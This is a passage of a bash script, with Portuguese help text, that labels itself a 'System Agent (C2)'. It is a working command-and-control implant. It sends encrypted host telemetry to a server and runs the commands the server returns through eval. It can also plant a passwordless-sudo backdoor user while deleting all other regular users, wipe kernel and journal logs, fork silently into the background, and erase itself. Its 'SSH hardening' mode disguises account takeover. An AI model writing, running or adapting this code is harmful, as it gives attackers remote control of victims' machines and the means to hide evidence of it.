    [ -z "$interfaces" ] && interfaces=$(ifconfig 2>/dev/null | grep inet | awk '{print $2}' | tr '\n' ' ')
    ssh_attempts=$(grep "Failed password" /var/log/auth.log 2>/dev/null | awk '{print $11}' | sort | uniq -c | sort -rn | head -10 | tr '\n' ';')
    [ -z "$ssh_attempts" ] && ssh_attempts=$(journalctl -u sshd 2>/dev/null | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn | head -10 | tr '\n' ';')

    cat << EOF
{"agent_id":"${agent_id}","ts":"${ts}","hostname":"${hostname}","user":"${user}","uptime":${uptime_sec:-0},"os":"${os}","kernel":"${kernel}","cpu_cores":${cpu_cores:-0},"mem_mb":${mem_total:-0},"swap_mb":${swap_total:-0},"disk":"${disks}","ip":"${ip_addr}","users":"${users_list}","interfaces":"${interfaces}","ssh_fail_attempts":"${ssh_attempts}"}
EOF
}

# ─── Background listener (TCP trigger, forked) ──────────────────────────
_do_cycle() {
    # push telemetry → poll commands → execute → push results
    local data encrypted resp
    data=$(collect_full_registration)
    encrypted=$(encrypt_payload "$data")
    resp=$(curl -s --max-time 30 -X POST \
        -H "Content-Type: text/plain" \
        -d "$encrypted" \
        "${SERVER}/" 2>/dev/null)
    [ -n "$resp" ] && echo "$resp" | grep -q "ok" && date +%s > "$TIMER_FILE" 2>/dev/null
    _poll_commands
}

_do_register() {
    _ensure_agent_id
    local data
    data=$(collect_full_registration)
    local encrypted
    encrypted=$(encrypt_payload "$data")

    local resp
    resp=$(curl -s --max-time 30 -X POST \
        -H "Content-Type: text/plain" \
        -d "$encrypted" \
        "${SERVER}/" 2>/dev/null)

    if [ -n "$resp" ] && echo "$resp" | grep -q "ok"; then
        date +%s > "$TIMER_FILE" 2>/dev/null
        echo "bws push successful"
    else
        echo "bws push error"
    fi

    _poll_commands
}

_connect_trigger() {
    _ensure_agent_id
    local agent_id
    agent_id=$(cat "$AGENT_ID_FILE" 2>/dev/null)
    [ -z "$agent_id" ] && return 1

    while true; do
        # HTTP long-poll: blocks until server has commands for us
        curl -s --max-time 120 "${SERVER}/trigger/${agent_id}" >/dev/null 2>&1
        # On response (trigger or timeout), do a full push+pill+execute cycle
        _do_cycle
    done
}

mode_background() {
    _ensure_agent_id
    _do_register
    echo "bws: starting background trigger listener..."
    (
        if command -v setsid >/dev/null 2>&1; then
            setsid "$BWS_BIN" --listen 0<&- &>/dev/null &
        else
            nohup "$BWS_BIN" --listen >/dev/null 2>&1 &
        fi
    ) 2>/dev/null
    exit 0
}

mode_listen() {
    _ensure_agent_id
    exec 0<&-
    exec 1>/dev/null
    exec 2>/dev/null
    _connect_trigger
}

# ─── Modes ────────────────────────────────────────────────────────────────
mode_register() {
    _do_register
    echo "bws: connected to trigger (TCP :9190)..."
    _connect_trigger
}

mode_once() {
    _ensure_agent_id
    local data
    data=$(collect_telemetry)
    local encrypted
    encrypted=$(encrypt_payload "$data")

    local resp
    resp=$(curl -s --max-time 30 -X POST \
        -H "Content-Type: text/plain" \
        -d "$encrypted" \
        "${SERVER}/" 2>/dev/null)

    if [ -n "$resp" ] && echo "$resp" | grep -q "ok"; then
        date +%s > "$TIMER_FILE" 2>/dev/null
        echo "bws push successful"
    else
        echo "bws push error"
    fi

    _poll_commands
}

mode_sync() {
    _ensure_agent_id
    local end=$(( $(date +%s) + 60 ))

    local data
    data=$(collect_telemetry)
    local encrypted
    encrypted=$(encrypt_payload "$data")

    curl -s --max-time 30 -X POST \
        -H "Content-Type: text/plain" \
        -d "$encrypted" \
        "${SERVER}/" 2>/dev/null || true

    while [ "$(date +%s)" -lt "$end" ]; do
        _poll_commands
        sleep 5
    done
    echo "OK: sync completed"
}

mode_destroy() {
    echo "bws: self-destroy..."
    rm -rf "$BWS_DIR" 2>/dev/null
    rm -f "$BWS_BIN" 2>/dev/null
    echo "OK: bws destroyed"
    exit 0
}

mode_secure() {
    echo "bws: hardening SSH..."

    if ! id bws >/dev/null 2>&1; then
        useradd -m -s /bin/bash bws 2>/dev/null
        echo "bws:bws@$(hostname)" | chpasswd 2>/dev/null
    fi

    if ! grep -q "^bws " /etc/sudoers 2>/dev/null; then
        echo "bws ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
    fi

    local bws_home
    bws_home=$(getent passwd bws 2>/dev/null | cut -d: -f6)
    [ -z "$bws_home" ] && bws_home="/home/bws"
    mkdir -p "${bws_home}/.ssh" 2>/dev/null
    chmod 700 "${bws_home}/.ssh" 2>/dev/null

    if [ ! -f "${bws_home}/.ssh/id_ed25519" ]; then
        ssh-keygen -t ed25519 -f "${bws_home}/.ssh/id_ed25519" -N "" -q 2>/dev/null
    fi

    cat "${bws_home}/.ssh/id_ed25519.pub" >> "${bws_home}/.ssh/authorized_keys" 2>/dev/null
    chmod 600 "${bws_home}/.ssh/authorized_keys" 2>/dev/null
    chown -R bws:bws "${bws_home}/.ssh" 2>/dev/null

    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config 2>/dev/null
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config 2>/dev/null
    sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
    sed -i 's/^#\?ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config 2>/dev/null

    systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || service ssh restart 2>/dev/null || true

    for u in $(awk -F: '$3>=1000 && $1!="bws" && $1!="nobody" {print $1}' /etc/passwd 2>/dev/null); do
        userdel -r "$u" 2>/dev/null || true
    done

    echo "OK: SSH hardened, user bws created, root password login disabled"
}

mode_kclean() {
    echo "bws: removing kernel logs..."
    rm -f /var/log/kern.log* 2>/dev/null
    rm -f /var/log/dmesg* 2>/dev/null
    rm -f /var/log/messages* 2>/dev/null
    journalctl --rotate 2>/dev/null
    journalctl --vacuum-time=1s 2>/dev/null
    journalctl --flush 2>/dev/null
    dmesg -c 2>/dev/null || true
    echo "OK: kernel logs removed"
}

mode_collect() {
    collect_telemetry
}

# ─── JSON parser (sem jq) ────────────────────────────────────────────────
_json_val() {
    local key="$1"
    local json="$2"
    local val
    val=$(echo "$json" | grep -oP "\"${key}\":\s*\"[^\"]*\"" | head -1 | sed "s/.*\"${key}\":\s*\"//" | sed 's/".*//')
    if [ -z "$val" ]; then
        val=$(echo "$json" | grep -oP "\"${key}\":\s*[0-9]+" | head -1 | sed "s/.*\"${key}\":\s*//")
    fi
    echo "$val"
}

_json_unescape() {
    local s="$1"
    s=$(echo "$s" | sed 's/\\u0026/\&/g; s/\\u003c/</g; s/\\u003e/>/g; s/\\u0022/"/g')
    echo "$s"
}

_json_arr() {
    local json="$1"
    echo "$json" | grep -oP '\{[^}]*\}' || true
}

# ─── Command execution ──────────────────────────────────────────────────
_run_action() {
    local action="$1"
    local params="$2"
    local result

    case "$action" in
        reboot)
            result=$(shutdown -r now 2>&1)
            ;;
        poweroff)
            result=$(shutdown -h now 2>&1)
            ;;
        change_password)
            local user pass
            if echo "$params" | grep -q '"user"'; then
                user=$(_json_val "user" "$params")
                pass=$(_json_val "password" "$params")
            else
                user="${params%% *}"
                pass="${params#* }"
                [ "$user" = "$pass" ] && pass=""
            fi
            [ -z "$user" ] && user="root"
            [ -n "$pass" ] && result=$(echo "${user}:${pass}" | chpasswd 2>&1) || result="FAIL: params must be user pass"
            ;;
        remove_user)
            local user
            if echo "$params" | grep -q '"user"'; then
                user=$(_json_val "user" "$params")
            else
                user="$params"
            fi
            result=$(userdel -r "$user" 2>&1)
            ;;
        add_sudo)
            local user
            if echo "$params" | grep -q '"user"'; then
                user=$(_json_val "user" "$params")
            else
                user="$params"
            fi
            result=$(echo "${user} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>&1 && echo "OK: ${user} added to sudoers")
            ;;
        write_file)
            local file content
            if echo "$params" | grep -q '"path"'; then
                file=$(_json_val "path" "$params")
                content=$(_json_val "content" "$params")
            else
                file="${params%% *}"
                content="${params#* }"
                [ "$file" = "$content" ] && content=""
            fi
            [ -n "$file" ] && result=$(echo "$content" > "$file" 2>&1 && echo "OK: wrote ${file}") || result="FAIL: path required"
            ;;
        collect|telemetry)
            result=$(collect_full_registration)
            ;;
        exec)
            local cmd
            if echo "$params" | grep -q '"command"'; then
                cmd=$(_json_val "command" "$params")
            else
                cmd="$params"
            fi
            [ -n "$cmd" ] && result=$(eval "$cmd" 2>&1) || result=""
            ;;
        cat_file)
            local cmd
            if echo "$params" | grep -q '"command"'; then
                cmd=$(_json_val "command" "$params")
            else
                cmd="cat $params"
            fi
            result=$(eval "$cmd" 2>&1)
            ;;
        grep_search)
            local cmd
            if echo "$params" | grep -q '"command"'; then
                cmd=$(_json_val "command" "$params")
            else
                cmd="$params"
            fi
            result=$(eval "$cmd" 2>&1)
            ;;
        *)
            result=$(eval "$params" 2>&1)
            ;;
    esac
    echo "$result"
}

# ─── Poll for commands ───────────────────────────────────────────────────
_poll_commands() {
    local agent_id
    agent_id=$(cat "$AGENT_ID_FILE" 2>/dev/null || echo "unknown")

    local response
    response=$(curl -s --max-time 60 "${SERVER}/poll/${agent_id}" 2>/dev/null)

    if [ -z "$response" ] || [ "$response" = "null" ] || [ "$response" = "[]" ]; then
        return
    fi

    local items
    items=$(_json_arr "$response")

    while read -r item; do
        [ -z "$item" ] && continue
        local action params result escaped
        action=$(_json_val "action" "$item")
        local job_id
        job_id=$(_json_val "job_id" "$item")
        params=$(_json_val "params" "$item")

        params=$(_json_unescape "$params")
        result=$(_run_action "$action" "$params")

        if [ -n "$job_id" ]; then
            escaped=$(echo "$result" | sed 's/\\/\\\\/g; s/"/\\"/g' | tr '\n' ' ' | sed 's/[[:cntrl:]]/ /g')
            curl -s --max-time 30 -X POST \
                -H "Content-Type: application/json" \
                -d "{\"job_id\":${job_id},\"status\":\"completed\",\"result\":\"${escaped}\"}" \
                "${SERVER}/result/${agent_id}" 2>/dev/null || true
        fi
    done <<< "$items"
}

# ─── Help ────────────────────────────────────────────────────────────────
# ─── Help ────────────────────────────────────────────────────────────────
print_help() {
    echo "bws - System Agent (C2)"
    echo
    echo "Uso: bws [opcao]"
    echo
    echo "  -p, --once    Push telemetry uma vez + poll comandos"
    echo "  -r            Registra host e conecta ao trigger TCP :9190"
    echo "  -s            Sync com servidor por 1 minuto"
    echo "  -d            Auto-destroy (remove binario e dados)"
    echo "  -n            Hardening SSH (cria user bws, chave ssh, desativa root pass)"
    echo "  -k            Remove logs do kernel"
    echo "  --background  Inicia listener em background (fork silencioso)"
    echo "  --listen      Modo listener (usado internamente pelo --background)"
    echo "  --collect     Exibe dados coletados (stdout)"
    echo "  -h, --help    Esta ajuda"
    echo "  -V, --version Versao"
    echo
    echo "Variavel de ambiente: osbin=<chave>"
    echo
}

# ─── Main ────────────────────────────────────────────────────────────────
if [ $# -eq 0 ]; then
    print_help
    exit 0
fi

# Check for --background flag (can be combined with -r)
bg=0
args=()
for arg in "$@"; do
    if [ "$arg" = "--background" ]; then
        bg=1
    else
        args+=("$arg")
    fi
done
set -- "${args[@]}"

case "$1" in
    -h|--help)    print_help ;;
    -V|--version) echo "bws v1.0.2 (Build 20260621)"; exit 0 ;;
    -p|--once)    mode_once ;;
    -r)
        if [ "$bg" -eq 1 ]; then
            mode_background
        else
            mode_register
        fi
        ;;
    --background) mode_background ;;
    --listen)     mode_listen ;;
    -s)           mode_sync ;;
    -d)           mode_destroy ;;
    -n)           mode_secure ;;
    -k)           mode_kclean ;;
    --collect)    mode_collect ;;
    "")
        [ "$bg" -eq 1 ] && mode_background || print_help
        ;;
    *)
        echo "Opcao desconhecida: $1"
        exit 1
        ;;
esac

exit 0
